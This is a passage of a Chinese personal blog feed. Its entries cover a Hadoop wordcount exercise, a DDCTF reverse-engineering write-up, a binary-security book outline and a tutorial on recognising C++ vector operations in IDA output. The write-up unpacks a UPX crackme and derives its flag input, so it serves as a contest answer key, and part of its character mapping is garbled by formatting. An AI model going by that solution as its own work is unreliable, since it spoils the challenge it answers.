<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -mv 你的单词文件 /<span class="built_in">test</span>/input</span><br></pre></td></tr></table></figure>


<p>可以看到目录下有wordCounter.jar</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hadoop@dblab-VirtualBox:/usr/<span class="built_in">local</span>/hadoop$ ls</span><br><span class="line">bin  etc  include  lib  libexec  LICENSE.txt  logs  NOTICE.txt  README.txt  sbin  share  tmp  wordCounter.jar  word.txt</span><br></pre></td></tr></table></figure>

<p>执行hadoop</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/hadoop jar wordCounter.jar <span class="string">'/test/input'</span> <span class="string">'/test/ouput'</span></span><br></pre></td></tr></table></figure>

<p>查看结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/hdfs dfs -cat /<span class="built_in">test</span>/ouput/part-r-00000</span><br><span class="line">game	1</span><br><span class="line">hadoop	2</span><br><span class="line">i	5</span><br><span class="line">love	5</span><br><span class="line">mapreduce	2</span><br><span class="line">this	1</span><br></pre></td></tr></table></figure>


<h1 id="自行配置eclipse自动补全"><a href="#自行配置eclipse自动补全" class="headerlink" title="自行配置eclipse自动补全"></a>自行配置eclipse自动补全</h1><p><img src="_v_images/20191025214212938_984636996.png" alt="如图"></p>
<p>配置自动补全</p>
<p>.abcdefghijklmnopqrstuvwxyz(,</p>
]]></content>
      <categories>
        <category>作业</category>
      </categories>
      <tags>
        <tag>大数据，作业</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴ctf_re1,2</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="DDCTF之re1详解"><a href="#DDCTF之re1详解" class="headerlink" title="DDCTF之re1详解"></a>DDCTF之re1详解</h1><p>前言：re1,可能我的是非预期解法吧，re2的话，可能也是非预期吧，不过做出来过后感觉这两道都蛮简单的，不会做的时候就是个傻子。。。</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>用ida打开这个程序，出现upx1,明显upx壳，linux下我用upx -d filename 脱了壳后。我先把ida出来的flag复制提交了下，没用。。。然后开始看算法，</p><a id="more"></a>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-804h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5h] [ebp-803h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+404h] [ebp-404h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+405h] [ebp-403h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input code:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v6);</span><br><span class="line">  sub_401000(&amp;v6);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;v4, <span class="string">"DDCTF&#123;reverseME&#125;"</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You've got it!!%s\n"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try again later.\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个过程很明朗，没有挖坑，关键函数就在sub_401000处，进去后</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = byte_402FF8[(<span class="keyword">char</span>)v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; result );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>…我发觉a1 - v1这是什么鬼，a1不是地址吗，v1又是什么鬼。。抱着一堆什么鬼都不知道的东西，我就直接上od了，因为这是windows逆向，所以我还是比较擅长动态调试的，大一一年几乎都是在啃汇编啃od,当时都不知道ida这玩意。</p>
<p>调试环境：吾爱虚拟机</p>
<p>工具：吾爱的OD</p>
<p>感觉像是为吾爱打了一波广告，哈哈，没关系，反正我也是论坛成员，宣传下没什么毛病<br>打开od载入程序后，点播放按钮，也就是运行按钮，然后右键中文搜索，搜索字符串，来到这里</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blu5vzhij319y0jgmxw.jpg" alt="2"></p>
<p>在定位到关键点please input code<br>这里很容易看出ida的逻辑，scanf后跟着的一个call便是关键，在此call处下断点，</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blucw5inj31hc0sj77u.jpg" alt="3"></p>
<p>然后输入12345678,</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blui7pb2j31hc0sj77t.jpg" alt="4"></p>
<p>成功断下，然后F7单步进入,在单步跟了一轮过后，我发觉pop这里有好东西<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blunfdy7j31hc0sjtc5.jpg" alt="6"><br>看堆栈窗口，也就是右下角，出现了跟我输入字符串一样长度的英文字符串，起初我也没在意，然后输入多几次后发觉，每次输入是对应的，也就是说，他跟凯撒密码类似，他只是移了下位，然后，我自己手动把键盘里所有出现的字符输入了一遍，发觉还是漏了一些，找不齐，最终就利用他本身含有的一个字符串进行输入，得到每个的对应字符串，他的字符串可以从od里直接看到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluu4xyaj31hc0sj77l.jpg" alt="7"><br>或者从ida里都可以找到<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2bluykzzgj30wi04pq3x.jpg" alt="8"><br>然后进行手动输入进行匹配，我需要的DDCTF{reverse}<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv2f2a7j31hc0sjwi3.jpg" alt="9"><br>看栈窗口，最上面的对应匹配，我这样手动把每个字符对应起来，就得到flag了<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g2blv7l7y4j31hc0sjwi2.jpg" alt="10"><br>最终得到对应字符<br>Z D<br>[ C<br>J T<br>, r<br>9 e<br>( v</p>
<ul>
<li>s<h1 id><a href="#" class="headerlink" title="{"></a>{</h1>! }<br>X F</li>
</ul>
<p>手动得到ZZ[JX#,9(9,+9!</p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>about_me</tag>
      </tags>
  </entry>
  <entry>
    <title>基础待补充</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="base"><a href="#base" class="headerlink" title="base"></a>base</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">-1</span> &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="string">'0xffffffff'</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>书籍文章目录</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<p>第一节：二进制安全概述<br>第二节：基础知识<br>    2.1 什么是软件<br>    2.2 什么是恶意软件<br>        2.2.1 潜藏广告<br>        2.2.2 木马<br>        2.2.3 病毒<br>        2.2.4 后门软件<br>    2.3 什么是漏洞<br>        2.3.1 poc是什么<br>        2.3.2 exp是什么<br>    2.4 虚拟环境<br>        2.4.1 沙盒<br>        2.4.2 虚拟机<br>    2.5 分析手法<br>        2.5.1 静态分析<br>        2.5.2 动态分析<br>第三节：二进制安全应用<br>    3.1 二进制层面的攻击<br>        3.1.1 软件的破解<br>        3.1.2 制作二进制层面的恶意软件<br>        3.1.3 利用软件漏洞攻击<br>    3.2 二进制层面的防御<br>        3.2.1 软件的安全防护<br>        3.2.1 恶意软件的防护<br>        3.2.1 软件漏洞的预防<br>第四节： 常见安全场景<br>    4.1 windows安全<br>    4.2 移动安全<br>        4.2.1 安卓安全<br>        4.2.2 ios安全<br>第五节： 二进制层面的安全防护<br>    5.1 基础级别防护<br>        5.1.1 安装杀毒软件<br>        5.1.2 下载方式的选择<br>        5.1.3 未知软件的处理<br>    5.2 进阶防护<br>        5.2.1 利用工具分析未知软件<br>        5.2.2 根据行为判别软件类别<br>        5.2.3 虚拟环境洞察软件行为<br>        5.2.4 应对处理措施</p>]]></content>
      <categories>
        <category>书籍文章目录</category>
      </categories>
      <tags>
        <tag>书籍目录</tag>
      </tags>
  </entry>
  <entry>
    <title>C++_vector_reverse</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="C-逆向之容器vector篇入门（本文首发于安全客）"><a href="#C-逆向之容器vector篇入门（本文首发于安全客）" class="headerlink" title="C++逆向之容器vector篇入门（本文首发于安全客）"></a>C++逆向之容器vector篇入门（本文首发于安全客）</h1><p>前言：说实话，我自己也不会c++的逆向。然后，现在太多的题目是c++的逆向了，一上来就是一堆容器，搞得我不得不去补补c++逆向部分的知识了，我这篇文章以西湖论剑的easyCpp为例，希望能给那些跟我一样是c++逆向的新手的朋友们一点启发。下面我就开始我的抛砖引玉篇幅吧，在这篇文章里，我会以题目中出现的逆向出来的代码以及C++的代码进行对比，让你们更好的知道，c++容器入门篇其实不难，开始正文：</p><a id="more"></a>
<p>我将先给你们介绍每个容器操作的代码以及ida反汇编出来的代码进行对比</p>
<h2 id="vector的构造以及析构"><a href="#vector的构造以及析构" class="headerlink" title="vector的构造以及析构"></a>vector的构造以及析构</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//声明一个int型向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//声明一个初始大小为5的int向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test2(<span class="number">5</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明一个初始大小为10且值都是1的向量</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test3(<span class="number">10</span>,<span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test4(num);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//用向量vec的第0个到第9个值初始化test3</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test5(test3.begin(), test3.end());</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test6(&amp;<span class="built_in">array</span>[<span class="number">1</span>], &amp;<span class="built_in">array</span>[<span class="number">4</span>]);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是C++代码，接下来是ida F5出现的代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-DCh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+40h] [rbp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+80h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+E2h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+E3h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [rsp+E4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+E9h] [rbp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+EAh] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+EBh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [rsp+ECh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v16, argv, envp);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为5的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v15, <span class="number">5L</span>L, &amp;v17);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v17);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建初始容量大小为10并且将元素初始化为1的vector</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v18);</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v14, <span class="number">10L</span>L, &amp;v19, &amp;v18);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v18);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明并用num向量初始化test4向量</span></span><br><span class="line">  v23 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v13, v23, &amp;v20);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v20);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v21);</span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v14);</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v14);</span><br><span class="line">  <span class="comment">//这两句在c++中相当于v14.begin()以及v14.end()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//这句看着很长，其实也就是构造函数，将::提取出来就可以看出std::vector&lt;...&gt;::vector&lt;...&gt;(...)</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v12,</span><br><span class="line">    v4,</span><br><span class="line">    v3,</span><br><span class="line">    &amp;v21);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v21);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">2</span>;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  v10 = <span class="number">4</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v22);</span><br><span class="line">  <span class="comment">//将arr[1]~arr[4]范围内的元素作为vec的初始值，v8为数组下标为1的元素，v11为最后一个</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>&lt;<span class="keyword">int</span> *,<span class="keyword">void</span>&gt;(&amp;v6, &amp;v8, &amp;v11, &amp;v22);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v22);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v13);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v14);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v15);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v16);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul>
<li>从代码里可以看出，在ida的识别世界里，他会先创建一个临时变量，然后将他的地址传到vector的构造函数里</li>
<li>而不同的vector构造函数，只是参数不同，第二个为初始容量，第三个为初始数值的地址，第四个为allocator用于分配内存</li>
<li>可以看出构造函数和析构函数是同时存在的</li>
<li>要学会简化所识别出来的C++代码，括号里的模板类可以不仔细看，只需要看他具体是什么函数就行</li>
</ul>
<p><strong>重点</strong>：<br>  v3 = std::vector&lt;int,std::allocator<int>&gt;::end(&amp;v14);<br>  v4 = std::vector&lt;int,std::allocator<int>&gt;::begin(&amp;v14);<br>  这两句要会识别，这是常用的，他是取容器的begin和end，相当于C++的v14.begin();v14.end();</int></int></p>
<h2 id="vector的常用操作识别"><a href="#vector的常用操作识别" class="headerlink" title="vector的常用操作识别"></a>vector的常用操作识别</h2><p>先进行vector操作知识的复习</p>
<p>vector对象最重要的几种操作</p>
<ol>
<li>v.push_back(t)    　　　　在容器的最后添加一个值为t的数据，容器的size变大。</li>
<li>v.size()              　 返回容器中数据的个数，size返回相应vector类定义的size_type的值。</li>
<li>v.empty()     　　　　　　判断vector是否为空</li>
<li>v[n]  或  v.at(n)        返回v中位置为n的元素，后者更加安全</li>
<li>v.insert(pointer,number, content)    向v中pointer指向的位置插入number个content的内容。<br> 还有v. insert(pointer, content)，v.insert(pointer,a[2],a[4])将a[2]到a[4]三个元素插入。</li>
<li>v.pop_back()    删除容器的末元素，并不返回该元素。</li>
<li>v.erase(pointer1,pointer2) 删除pointer1到pointer2中间（包括pointer1所指）的元素。<br> vector中删除一个元素后，此位置以后的元素都需要往前移动一个位置，虽然当前迭代器位置没有自动加1，<br> 但是由于后续元素的顺次前移，也就相当于迭代器的自动指向下一个位置一样。</li>
<li>v1==v2          判断v1与v2是否相等。</li>
<li>！=、&lt;、&lt;=、&gt;、&gt;=      保持这些操作符惯有含义。</li>
<li>vector<typename>::iterator p=v1.begin( ); p初始值指向v1的第一个元素。*p取所指向元素的值。<br>  对于const vector<typename>只能用vector<typename>::const_iterator类型的指针访问。</typename></typename></typename></li>
<li>p=v1.end( ); p指向v1的最后一个元素的下一位置。</li>
<li>v.clear()      删除容器中的所有元素。</li>
<li>v.resize(2<em>v.size)或v.resize(2</em>v.size, 99)　　 将v的容量翻倍(并把新元素的值初始化为99)</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line">    <span class="comment">//创建一个vector，并且将5个数值压入容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        test.push_back(i);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出容器大小</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; test.size();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除容器中最后的一个元素</span></span><br><span class="line">    test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断容器是否为空，若非空，删除一个元素</span></span><br><span class="line">    <span class="keyword">if</span>(!test.empty())</span><br><span class="line">        test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新设置容器大小并赋值</span></span><br><span class="line">    test.resize(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个新容器，并判断新容器跟旧容器是否相等</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(test1 == test)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Right!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将区间[first,last)的元素赋值到当前的vector容器中，或者赋n个值为x的元素到vector容器中，这个容器会清除掉vector容器中以前的内容</span></span><br><span class="line">    test1.assign(test.begin(), test.end());</span><br><span class="line">    getchar();</span><br><span class="line">    test.clear();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以下是ida f5识别出来的代码，我相信很多新手看到这么多代码，已经开始晕了，不要紧，一步步给你分析下，我将每一步用getchar进行分割，方便你们看懂，你们自己调试的时候也可以这么做</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+54h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+5Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用上一节的知识，这里创建了一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v10, argv, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  <span class="comment">//这里相当于v10.push_back(i)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span 